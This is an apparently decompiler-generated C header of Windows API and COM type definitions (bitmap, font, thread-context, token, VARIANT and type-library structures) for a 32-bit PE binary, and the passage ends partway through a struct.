typedef unsigned char   undefined;

typedef unsigned int    ImageBaseOffset32;
typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
float10
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned long long    ulonglong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned long long    undefined8;
typedef unsigned short    ushort;
typedef short    wchar_t;
typedef unsigned short    word;
typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef unsigned short    wchar16;
typedef struct _ICONINFO _ICONINFO, *P_ICONINFO;

typedef struct _ICONINFO ICONINFO;

typedef ICONINFO * PICONINFO;

typedef int BOOL;

typedef ulong DWORD;

typedef struct HBITMAP__ HBITMAP__, *PHBITMAP__;

typedef struct HBITMAP__ * HBITMAP;

struct HBITMAP__ {
    int unused;
};

struct _ICONINFO {
    BOOL fIcon;
    DWORD xHotspot;
    DWORD yHotspot;
    HBITMAP hbmMask;
    HBITMAP hbmColor;
};

typedef struct tagRGBQUAD tagRGBQUAD, *PtagRGBQUAD;

typedef struct tagRGBQUAD RGBQUAD;

typedef uchar BYTE;

struct tagRGBQUAD {
    BYTE rgbBlue;
    BYTE rgbGreen;
    BYTE rgbRed;
    BYTE rgbReserved;
};

typedef struct tagLOGFONTA tagLOGFONTA, *PtagLOGFONTA;

typedef long LONG;

typedef char CHAR;

struct tagLOGFONTA {
    LONG lfHeight;
    LONG lfWidth;
    LONG lfEscapement;
    LONG lfOrientation;
    LONG lfWeight;
    BYTE lfItalic;
    BYTE lfUnderline;
    BYTE lfStrikeOut;
    BYTE lfCharSet;
    BYTE lfOutPrecision;
    BYTE lfClipPrecision;
    BYTE lfQuality;
    BYTE lfPitchAndFamily;
    CHAR lfFaceName[32];
};

typedef struct tagLOGBRUSH tagLOGBRUSH, *PtagLOGBRUSH;

typedef uint UINT;

typedef DWORD COLORREF;

typedef ulong ULONG_PTR;

struct tagLOGBRUSH {
    UINT lbStyle;
    COLORREF lbColor;
    ULONG_PTR lbHatch;
};

typedef struct tagTEXTMETRICA tagTEXTMETRICA, *PtagTEXTMETRICA;

struct tagTEXTMETRICA {
    LONG tmHeight;
    LONG tmAscent;
    LONG tmDescent;
    LONG tmInternalLeading;
    LONG tmExternalLeading;
    LONG tmAveCharWidth;
    LONG tmMaxCharWidth;
    LONG tmWeight;
    LONG tmOverhang;
    LONG tmDigitizedAspectX;
    LONG tmDigitizedAspectY;
    BYTE tmFirstChar;
    BYTE tmLastChar;
    BYTE tmDefaultChar;
    BYTE tmBreakChar;
    BYTE tmItalic;
    BYTE tmUnderlined;
    BYTE tmStruckOut;
    BYTE tmPitchAndFamily;
    BYTE tmCharSet;
};

typedef struct tagLOGPEN tagLOGPEN, *PtagLOGPEN;

typedef struct tagLOGPEN LOGPEN;

typedef struct tagPOINT tagPOINT, *PtagPOINT;

typedef struct tagPOINT POINT;

struct tagPOINT {
    LONG x;
    LONG y;
};

struct tagLOGPEN {
    UINT lopnStyle;
    POINT lopnWidth;
    COLORREF lopnColor;
};

typedef struct tagBITMAPINFO tagBITMAPINFO, *PtagBITMAPINFO;

typedef struct tagBITMAPINFOHEADER tagBITMAPINFOHEADER, *PtagBITMAPINFOHEADER;

typedef struct tagBITMAPINFOHEADER BITMAPINFOHEADER;

typedef ushort WORD;

struct tagBITMAPINFOHEADER {
    DWORD biSize;
    LONG biWidth;
    LONG biHeight;
    WORD biPlanes;
    WORD biBitCount;
    DWORD biCompression;
    DWORD biSizeImage;
    LONG biXPelsPerMeter;
    LONG biYPelsPerMeter;
    DWORD biClrUsed;
    DWORD biClrImportant;
};

struct tagBITMAPINFO {
    BITMAPINFOHEADER bmiHeader;
    RGBQUAD bmiColors[1];
};

typedef struct tagMETAFILEPICT tagMETAFILEPICT, *PtagMETAFILEPICT;

typedef struct tagMETAFILEPICT METAFILEPICT;

typedef struct HMETAFILE__ HMETAFILE__, *PHMETAFILE__;

typedef struct HMETAFILE__ * HMETAFILE;

struct tagMETAFILEPICT {
    LONG mm;
    LONG xExt;
    LONG yExt;
    HMETAFILE hMF;
};

struct HMETAFILE__ {
    int unused;
};

typedef struct tagENHMETAHEADER tagENHMETAHEADER, *PtagENHMETAHEADER;

typedef struct tagENHMETAHEADER * LPENHMETAHEADER;

typedef struct _RECTL _RECTL, *P_RECTL;

typedef struct _RECTL RECTL;

typedef struct tagSIZE tagSIZE, *PtagSIZE;

typedef struct tagSIZE SIZE;

typedef SIZE SIZEL;

struct tagSIZE {
    LONG cx;
    LONG cy;
};

struct _RECTL {
    LONG left;
    LONG top;
    LONG right;
    LONG bottom;
};

struct tagENHMETAHEADER {
    DWORD iType;
    DWORD nSize;
    RECTL rclBounds;
    RECTL rclFrame;
    DWORD dSignature;
    DWORD nVersion;
    DWORD nBytes;
    DWORD nRecords;
    WORD nHandles;
    WORD sReserved;
    DWORD nDescription;
    DWORD offDescription;
    DWORD nPalEntries;
    SIZEL szlDevice;
    SIZEL szlMillimeters;
    DWORD cbPixelFormat;
    DWORD offPixelFormat;
    DWORD bOpenGL;
    SIZEL szlMicrometers;
};

typedef struct tagBITMAPINFO BITMAPINFO;

typedef struct tagPALETTEENTRY tagPALETTEENTRY, *PtagPALETTEENTRY;

struct tagPALETTEENTRY {
    BYTE peRed;
    BYTE peGreen;
    BYTE peBlue;
    BYTE peFlags;
};

typedef struct tagLOGPALETTE tagLOGPALETTE, *PtagLOGPALETTE;

typedef struct tagLOGPALETTE LOGPALETTE;

typedef struct tagPALETTEENTRY PALETTEENTRY;

struct tagLOGPALETTE {
    WORD palVersion;
    WORD palNumEntries;
    PALETTEENTRY palPalEntry[1];
};

typedef struct tagBITMAPINFO * LPBITMAPINFO;

typedef struct tagLOGBRUSH LOGBRUSH;

typedef struct tagLOGFONTA LOGFONTA;

typedef struct tagPALETTEENTRY * LPPALETTEENTRY;

typedef struct tagTEXTMETRICA * LPTEXTMETRICA;

typedef struct _GUID _GUID, *P_GUID;

typedef struct _GUID GUID;

struct _GUID {
    ulong Data1;
    ushort Data2;
    ushort Data3;
    uchar Data4[8];
};

typedef GUID IID;

typedef struct _cpinfo _cpinfo, *P_cpinfo;

struct _cpinfo {
    UINT MaxCharSize;
    BYTE DefaultChar[2];
    BYTE LeadByte[12];
};

typedef CHAR * LPSTR;

typedef BOOL (* CALINFO_ENUMPROCA)(LPSTR);

typedef struct _cpinfo * LPCPINFO;

typedef DWORD LCTYPE;

typedef DWORD CALID;

typedef DWORD CALTYPE;

typedef struct _SYSTEM_INFO _SYSTEM_INFO, *P_SYSTEM_INFO;

typedef struct _SYSTEM_INFO * LPSYSTEM_INFO;

typedef union _union_530 _union_530, *P_union_530;

typedef void * LPVOID;

typedef ULONG_PTR DWORD_PTR;

typedef struct _struct_531 _struct_531, *P_struct_531;

struct _struct_531 {
    WORD wProcessorArchitecture;
    WORD wReserved;
};

union _union_530 {
    DWORD dwOemId;
    struct _struct_531 s;
};

struct _SYSTEM_INFO {
    union _union_530 u;
    DWORD dwPageSize;
    LPVOID lpMinimumApplicationAddress;
    LPVOID lpMaximumApplicationAddress;
    DWORD_PTR dwActiveProcessorMask;
    DWORD dwNumberOfProcessors;
    DWORD dwProcessorType;
    DWORD dwAllocationGranularity;
    WORD wProcessorLevel;
    WORD wProcessorRevision;
};

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef union _union_518 _union_518, *P_union_518;

typedef void * HANDLE;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void * PVOID;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _SYSTEMTIME _SYSTEMTIME, *P_SYSTEMTIME;

typedef struct _SYSTEMTIME SYSTEMTIME;

struct _SYSTEMTIME {
    WORD wYear;
    WORD wMonth;
    WORD wDayOfWeek;
    WORD wDay;
    WORD wHour;
    WORD wMinute;
    WORD wSecond;
    WORD wMilliseconds;
};

typedef struct _WIN32_FIND_DATAA _WIN32_FIND_DATAA, *P_WIN32_FIND_DATAA;

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME FILETIME;

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

struct _WIN32_FIND_DATAA {
    DWORD dwFileAttributes;
    FILETIME ftCreationTime;
    FILETIME ftLastAccessTime;
    FILETIME ftLastWriteTime;
    DWORD nFileSizeHigh;
    DWORD nFileSizeLow;
    DWORD dwReserved0;
    DWORD dwReserved1;
    CHAR cFileName[260];
    CHAR cAlternateFileName[14];
};

typedef struct _OVERLAPPED * LPOVERLAPPED;

typedef struct _SECURITY_ATTRIBUTES * LPSECURITY_ATTRIBUTES;

typedef struct _STARTUPINFOA _STARTUPINFOA, *P_STARTUPINFOA;

typedef BYTE * LPBYTE;

struct _STARTUPINFOA {
    DWORD cb;
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _WIN32_FIND_DATAA * LPWIN32_FIND_DATAA;

typedef struct _STARTUPINFOA * LPSTARTUPINFOA;

typedef struct _RTL_CRITICAL_SECTION _RTL_CRITICAL_SECTION, *P_RTL_CRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION * PRTL_CRITICAL_SECTION;

typedef PRTL_CRITICAL_SECTION LPCRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION_DEBUG _RTL_CRITICAL_SECTION_DEBUG, *P_RTL_CRITICAL_SECTION_DEBUG;

typedef struct _RTL_CRITICAL_SECTION_DEBUG * PRTL_CRITICAL_SECTION_DEBUG;

typedef struct _LIST_ENTRY _LIST_ENTRY, *P_LIST_ENTRY;

typedef struct _LIST_ENTRY LIST_ENTRY;

struct _RTL_CRITICAL_SECTION {
    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;
    LONG LockCount;
    LONG RecursionCount;
    HANDLE OwningThread;
    HANDLE LockSemaphore;
    ULONG_PTR SpinCount;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY * Flink;
    struct _LIST_ENTRY * Blink;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    WORD Type;
    WORD CreatorBackTraceIndex;
    struct _RTL_CRITICAL_SECTION * CriticalSection;
    LIST_ENTRY ProcessLocksList;
    DWORD EntryCount;
    DWORD ContentionCount;
    DWORD Flags;
    WORD CreatorBackTraceIndexHigh;
    WORD SpareWORD;
};

typedef struct _SYSTEMTIME * LPSYSTEMTIME;

typedef struct _MEMORY_BASIC_INFORMATION _MEMORY_BASIC_INFORMATION, *P_MEMORY_BASIC_INFORMATION;

typedef ULONG_PTR SIZE_T;

struct _MEMORY_BASIC_INFORMATION {
    PVOID BaseAddress;
    PVOID AllocationBase;
    DWORD AllocationProtect;
    SIZE_T RegionSize;
    DWORD State;
    DWORD Protect;
    DWORD Type;
};

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD * PEXCEPTION_RECORD;

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD * ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

typedef double ULONGLONG;

typedef union _LARGE_INTEGER _LARGE_INTEGER, *P_LARGE_INTEGER;

typedef struct _struct_19 _struct_19, *P_struct_19;

typedef struct _struct_20 _struct_20, *P_struct_20;

typedef double LONGLONG;

struct _struct_20 {
    DWORD LowPart;
    LONG HighPart;
};

struct _struct_19 {
    DWORD LowPart;
    LONG HighPart;
};

union _LARGE_INTEGER {
    struct _struct_19 s;
    struct _struct_20 u;
    LONGLONG QuadPart;
};

typedef union _LARGE_INTEGER LARGE_INTEGER;

typedef wchar_t WCHAR;

typedef WCHAR * LPWSTR;

typedef struct _SID_IDENTIFIER_AUTHORITY _SID_IDENTIFIER_AUTHORITY, *P_SID_IDENTIFIER_AUTHORITY;

typedef struct _SID_IDENTIFIER_AUTHORITY * PSID_IDENTIFIER_AUTHORITY;

struct _SID_IDENTIFIER_AUTHORITY {
    BYTE Value[6];
};

typedef WCHAR * LPCWSTR;

typedef long HRESULT;

typedef CHAR * LPCSTR;

typedef struct _MEMORY_BASIC_INFORMATION * PMEMORY_BASIC_INFORMATION;

typedef LONG * PLONG;

typedef struct _OSVERSIONINFOA _OSVERSIONINFOA, *P_OSVERSIONINFOA;

struct _OSVERSIONINFOA {
    DWORD dwOSVersionInfoSize;
    DWORD dwMajorVersion;
    DWORD dwMinorVersion;
    DWORD dwBuildNumber;
    DWORD dwPlatformId;
    CHAR szCSDVersion[128];
};

typedef enum _TOKEN_INFORMATION_CLASS {
    TokenUser=1,
    TokenGroups=2,
    TokenPrivileges=3,
    TokenOwner=4,
    TokenPrimaryGroup=5,
    TokenDefaultDacl=6,
    TokenSource=7,
    TokenType=8,
    TokenImpersonationLevel=9,
    TokenStatistics=10,
    TokenRestrictedSids=11,
    TokenSessionId=12,
    TokenGroupsAndPrivileges=13,
    TokenSessionReference=14,
    TokenSandBoxInert=15,
    TokenAuditPolicy=16,
    TokenOrigin=17,
    TokenElevationType=18,
    TokenLinkedToken=19,
    TokenElevation=20,
    TokenHasRestrictions=21,
    TokenAccessInformation=22,
    TokenVirtualizationAllowed=23,
    TokenVirtualizationEnabled=24,
    TokenIntegrityLevel=25,
    TokenUIAccess=26,
    TokenMandatoryPolicy=27,
    TokenLogonSid=28,
    MaxTokenInfoClass=29
} _TOKEN_INFORMATION_CLASS;

typedef struct _OSVERSIONINFOA * LPOSVERSIONINFOA;

typedef PVOID PSID;

typedef CONTEXT * PCONTEXT;

typedef short SHORT;

typedef DWORD ACCESS_MASK;

typedef DWORD LCID;

typedef CHAR * PCNZCH;

typedef enum _TOKEN_INFORMATION_CLASS TOKEN_INFORMATION_CLASS;

typedef HANDLE * PHANDLE;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[192]; // Actual DOS program
};

typedef struct tagFUNCDESC tagFUNCDESC, *PtagFUNCDESC;

typedef LONG DISPID;

typedef DISPID MEMBERID;

typedef LONG SCODE;

typedef struct tagELEMDESC tagELEMDESC, *PtagELEMDESC;

typedef struct tagELEMDESC ELEMDESC;

typedef enum tagFUNCKIND {
    FUNC_VIRTUAL=0,
    FUNC_PUREVIRTUAL=1,
    FUNC_NONVIRTUAL=2,
    FUNC_STATIC=3,
    FUNC_DISPATCH=4
} tagFUNCKIND;

typedef enum tagFUNCKIND FUNCKIND;

typedef enum tagINVOKEKIND {
    INVOKE_FUNC=1,
    INVOKE_PROPERTYGET=2,
    INVOKE_PROPERTYPUT=4,
    INVOKE_PROPERTYPUTREF=8
} tagINVOKEKIND;

typedef enum tagINVOKEKIND INVOKEKIND;

typedef enum tagCALLCONV {
    CC_FASTCALL=0,
    CC_CDECL=1,
    CC_MSCPASCAL=2,
    CC_PASCAL=3,
    CC_MACPASCAL=4,
    CC_STDCALL=5,
    CC_FPFASTCALL=6,
    CC_SYSCALL=7,
    CC_MPWCDECL=8,
    CC_MPWPASCAL=9,
    CC_MAX=10
} tagCALLCONV;

typedef enum tagCALLCONV CALLCONV;

typedef struct tagTYPEDESC tagTYPEDESC, *PtagTYPEDESC;

typedef struct tagTYPEDESC TYPEDESC;

typedef union _union_2702 _union_2702, *P_union_2702;

typedef union _union_2691 _union_2691, *P_union_2691;

typedef ushort VARTYPE;

typedef struct tagIDLDESC tagIDLDESC, *PtagIDLDESC;

typedef struct tagIDLDESC IDLDESC;

typedef struct tagPARAMDESC tagPARAMDESC, *PtagPARAMDESC;

typedef struct tagPARAMDESC PARAMDESC;

typedef struct tagARRAYDESC tagARRAYDESC, *PtagARRAYDESC;

typedef DWORD HREFTYPE;

typedef ushort USHORT;

typedef struct tagPARAMDESCEX tagPARAMDESCEX, *PtagPARAMDESCEX;

typedef struct tagPARAMDESCEX * LPPARAMDESCEX;

typedef struct tagSAFEARRAYBOUND tagSAFEARRAYBOUND, *PtagSAFEARRAYBOUND;

typedef struct tagSAFEARRAYBOUND SAFEARRAYBOUND;

typedef DWORD ULONG;

typedef struct tagVARIANT tagVARIANT, *PtagVARIANT;

typedef struct tagVARIANT VARIANT;

typedef VARIANT VARIANTARG;

typedef union _union_2683 _union_2683, *P_union_2683;

typedef struct __tagVARIANT __tagVARIANT, *P__tagVARIANT;

typedef struct tagDEC tagDEC, *PtagDEC;

typedef struct tagDEC DECIMAL;

typedef union _union_2685 _union_2685, *P_union_2685;

typedef union _union_1695 _union_1695, *P_union_1695;

typedef union _union_1697 _union_1697, *P_union_1697;

typedef float FLOAT;

typedef double DOUBLE;

typedef short VARIANT_BOOL;

typedef union tagCY tagCY, *PtagCY;

typedef union tagCY CY;

typedef double DATE;

typedef WCHAR OLECHAR;

typedef OLECHAR * BSTR;

typedef struct IUnknown IUnknown, *PIUnknown;

typedef struct IDispatch IDispatch, *PIDispatch;

typedef struct tagSAFEARRAY tagSAFEARRAY, *PtagSAFEARRAY;

typedef struct tagSAFEARRAY SAFEARRAY;

typedef int INT;

typedef struct __tagBRECORD __tagBRECORD, *P__tagBRECORD;

typedef struct _struct_1696 _struct_1696, *P_struct_1696;

typedef struct _struct_1698 _struct_1698, *P_struct_1698;

typedef struct _struct_1693 _struct_1693, *P_struct_1693;

typedef struct IUnknownVtbl IUnknownVtbl, *PIUnknownVtbl;

typedef struct IDispatchVtbl IDispatchVtbl, *PIDispatchVtbl;

typedef struct ITypeInfo ITypeInfo, *PITypeInfo;

typedef OLECHAR * LPOLESTR;

typedef struct tagDISPPARAMS tagDISPPARAMS, *PtagDISPPARAMS;

typedef struct tagDISPPARAMS DISPPARAMS;

typedef struct tagEXCEPINFO tagEXCEPINFO, *PtagEXCEPINFO;

typedef struct tagEXCEPINFO EXCEPINFO;

typedef struct IRecordInfo IRecordInfo, *PIRecordInfo;

typedef struct ITypeInfoVtbl ITypeInfoVtbl, *PITypeInfoVtbl;

typedef struct tagTYPEATTR tagTYPEATTR, *PtagTYPEATTR;

typedef struct tagTYPEATTR TYPEATTR;

typedef struct ITypeComp ITypeComp, *PITypeComp;

typedef struct tagFUNCDESC FUNCDESC;

typedef struct tagVARDESC tagVARDESC, *PtagVARDESC;

typedef struct tagVARDESC VARDESC;

typedef struct ITypeLib ITypeLib, *PITypeLib;

typedef struct IRecordInfoVtbl IRecordInfoVtbl, *PIRecordInfoVtbl;

typedef OLECHAR * LPCOLESTR;

typedef enum tagTYPEKIND {
    TKIND_ENUM=0,
    TKIND_RECORD=1,
    TKIND_MODULE=2,
    TKIND_INTERFACE=3,
    TKIND_DISPATCH=4,
    TKIND_COCLASS=5,
    TKIND_ALIAS=6,
    TKIND_UNION=7,
    TKIND_MAX=8
} tagTYPEKIND;

typedef enum tagTYPEKIND TYPEKIND;

typedef struct ITypeCompVtbl ITypeCompVtbl, *PITypeCompVtbl;

typedef enum tagDESCKIND {
    DESCKIND_NONE=0,
    DESCKIND_FUNCDESC=1,
    DESCKIND_VARDESC=2,
    DESCKIND_TYPECOMP=3,
    DESCKIND_IMPLICITAPPOBJ=4,
    DESCKIND_MAX=5
} tagDESCKIND;

typedef enum tagDESCKIND DESCKIND;

typedef union tagBINDPTR tagBINDPTR, *PtagBINDPTR;

typedef union tagBINDPTR BINDPTR;

typedef union _union_2711 _union_2711, *P_union_2711;

typedef enum tagVARKIND {
    VAR_PERINSTANCE=0,
    VAR_STATIC=1,
    VAR_CONST=2,
    VAR_DISPATCH=3
} tagVARKIND;

typedef enum tagVARKIND VARKIND;

typedef struct ITypeLibVtbl ITypeLibVtbl, *PITypeLibVtbl;

typedef struct tagTLIBATTR tagTLIBATTR, *PtagTLIBATTR;

typedef struct tagTLIBATTR TLIBATTR;

typedef enum tagSYSKIND {
    SYS_WIN16=0,
    SYS_WIN32=1,
    SYS_MAC=2,
    SYS_WIN64=3
} tagSYSKIND;

typedef enum tagSYSKIND SYSKIND;

struct _struct_1693 {
    ulong Lo;
    long Hi;
};

union tagCY {
    struct _struct_1693 s;
    LONGLONG int64;
};

struct _struct_1698 {
    ULONG Lo32;
    ULONG Mid32;
};

union _union_1697 {
    struct _struct_1698 s2;
    ULONGLONG Lo64;
};

struct _struct_1696 {
    BYTE scale;
    BYTE sign;
};

union _union_1695 {
    struct _struct_1696 s;
    USHORT signscale;
};

struct tagDEC {
    USHORT wReserved;
    union _union_1695 u;
    ULONG Hi32;
    union _union_1697 u2;
};

struct __tagBRECORD {
    PVOID pvRecord;
    struct IRecordInfo * pRecInfo;
};

union _union_2685 {
    LONGLONG llVal;
    LONG lVal;
    BYTE bVal;
    SHORT iVal;
    FLOAT fltVal;
    DOUBLE dblVal;
    VARIANT_BOOL boolVal;
    SCODE scode;
    CY cyVal;
    DATE date;
    BSTR bstrVal;
    struct IUnknown * punkVal;
    struct IDispatch * pdispVal;
    SAFEARRAY * parray;
    BYTE * pbVal;
    SHORT * piVal;
    LONG * plVal;
    LONGLONG * pllVal;
    FLOAT * pfltVal;
    DOUBLE * pdblVal;
    VARIANT_BOOL * pboolVal;
    SCODE * pscode;
    CY * pcyVal;
    DATE * pdate;
    BSTR * pbstrVal;
    struct IUnknown * * ppunkVal;
    struct IDispatch * * ppdispVal;
    SAFEARRAY * * pparray;
    VARIANT * pvarVal;
    PVOID byref;
    CHAR cVal;
    USHORT uiVal;
    ULONG ulVal;
    ULONGLONG ullVal;
    INT intVal;
    UINT uintVal;
    DECIMAL * pdecVal;
    CHAR * pcVal;
    USHORT * puiVal;
    ULONG * pulVal;
    ULONGLONG * pullVal;
    INT * pintVal;
    UINT * puintVal;
    struct __tagBRECORD brecVal;
};

struct __tagVARIANT {
    VARTYPE vt;
    WORD wReserved1;
    WORD wReserved2;
    WORD wReserved3;
    union _union_2685 n3;
};

union _union_2683 {
    struct __tagVARIANT n2;
    DECIMAL decVal;
};

union _union_2691 {
    struct tagTYPEDESC * lptdesc;
    struct tagARRAYDESC * lpadesc;
    HREFTYPE hreftype;
};

struct tagTYPEDESC {
    union _union_2691 u;
    VARTYPE vt;
};

struct tagIDLDESC {
    ULONG_PTR dwReserved;
    USHORT wIDLFlags;
};

struct tagPARAMDESC {
    LPPARAMDESCEX pparamdescex;
    USHORT wParamFlags;
};

union _union_2702 {
    IDLDESC idldesc;
    PARAMDESC paramdesc;
};

struct tagELEMDESC {
    TYPEDESC tdesc;
    union _union_2702 u;
};

struct tagFUNCDESC {
    MEMBERID memid;
    SCODE * lprgscode;
    ELEMDESC * lprgelemdescParam;
    FUNCKIND funckind;
    INVOKEKIND invkind;
    CALLCONV callconv;
    SHORT cParams;
    SHORT cParamsOpt;
    SHORT oVft;
    SHORT cScodes;
    ELEMDESC elemdescFunc;
    WORD wFuncFlags;
};

struct tagVARIANT {
    union _union_2683 n1;
};

struct tagPARAMDESCEX {
    ULONG cBytes;
    VARIANTARG varDefaultValue;
};

union _union_2711 {
    ULONG oInst;
    VARIANT * lpvarValue;
};

struct tagVARDESC {
    MEMBERID memid;
    LPOLESTR lpstrSchema;
    union _union_2711 u;
    ELEMDESC elemdescVar;
    WORD wVarFlags;
    VARKIND varkind;
};

struct ITypeCompVtbl {
    HRESULT (* QueryInterface)(struct ITypeComp *, IID *, void * *);
    ULONG (* AddRef)(struct ITypeComp *);
    ULONG (* Release)(struct ITypeComp *);
    HRESULT (* Bind)(struct ITypeComp *, LPOLESTR, ULONG, WORD, struct ITypeInfo * *, DESCKIND *, BINDPTR *);
    HRESULT (* BindType)(struct ITypeComp *, LPOLESTR, ULONG, struct ITypeInfo * *, struct ITypeComp * *);
};

struct tagSAFEARRAYBOUND {
    ULONG cElements;
    LONG lLbound;
};

struct tagSAFEARRAY {
    USHORT cDims;
    USHORT fFeatures;
    ULONG cbElements;
    ULONG cLocks;
    PVOID pvData;
    SAFEARRAYBOUND rgsabound[1];
};

struct ITypeInfoVtbl {
    HRESULT (* QueryInterface)(struct ITypeInfo *, IID *, void * *);
    ULONG (* AddRef)(struct ITypeInfo *);
    ULONG (* Release)(struct ITypeInfo *);
    HRESULT (* GetTypeAttr)(struct ITypeInfo *, TYPEATTR * *);
    HRESULT (* GetTypeComp)(struct ITypeInfo *, struct ITypeComp * *);
    HRESULT (* GetFuncDesc)(struct ITypeInfo *, UINT, FUNCDESC * *);
    HRESULT (* GetVarDesc)(struct ITypeInfo *, UINT, VARDESC * *);
    HRESULT (* GetNames)(struct ITypeInfo *, MEMBERID, BSTR *, UINT, UINT *);
    HRESULT (* GetRefTypeOfImplType)(struct ITypeInfo *, UINT, HREFTYPE *);
    HRESULT (* GetImplTypeFlags)(struct ITypeInfo *, UINT, INT *);
    HRESULT (* GetIDsOfNames)(struct ITypeInfo *, LPOLESTR *, UINT, MEMBERID *);
    HRESULT (* Invoke)(struct ITypeInfo *, PVOID, MEMBERID, WORD, DISPPARAMS *, VARIANT *, EXCEPINFO *, UINT *);
    HRESULT (* GetDocumentation)(struct ITypeInfo *, MEMBERID, BSTR *, BSTR *, DWORD *, BSTR *);
    HRESULT (* GetDllEntry)(struct ITypeInfo *, MEMBERID, INVOKEKIND, BSTR *, BSTR *, WORD *);
    HRESULT (* GetRefTypeInfo)(struct ITypeInfo *, HREFTYPE, struct ITypeInfo * *);
    HRESULT (* AddressOfMember)(struct ITypeInfo *, MEMBERID, INVOKEKIND, PVOID *);
    HRESULT (* CreateInstance)(struct ITypeInfo *, struct IUnknown *, IID *, PVOID *);
    HRESULT (* GetMops)(struct ITypeInfo *, MEMBERID, BSTR *);
    HRESULT (* GetContainingTypeLib)(struct ITypeInfo *, struct ITypeLib * *, UINT *);
    void (* ReleaseTypeAttr)(struct ITypeInfo *, TYPEATTR *);
    void (* ReleaseFuncDesc)(struct ITypeInfo *, FUNCDESC *);
    void (* ReleaseVarDesc)(struct ITypeInfo *, VARDESC *);
};

struct ITypeLibVtbl {
    HRESULT (* QueryInterface)(struct ITypeLib *, IID *, void * *);
    ULONG (* AddRef)(struct ITypeLib *);
    ULONG (* Release)(struct ITypeLib *);
    UINT (* GetTypeInfoCount)(struct ITypeLib *);
    HRESULT (* GetTypeInfo)(struct ITypeLib *, UINT, struct ITypeInfo * *);
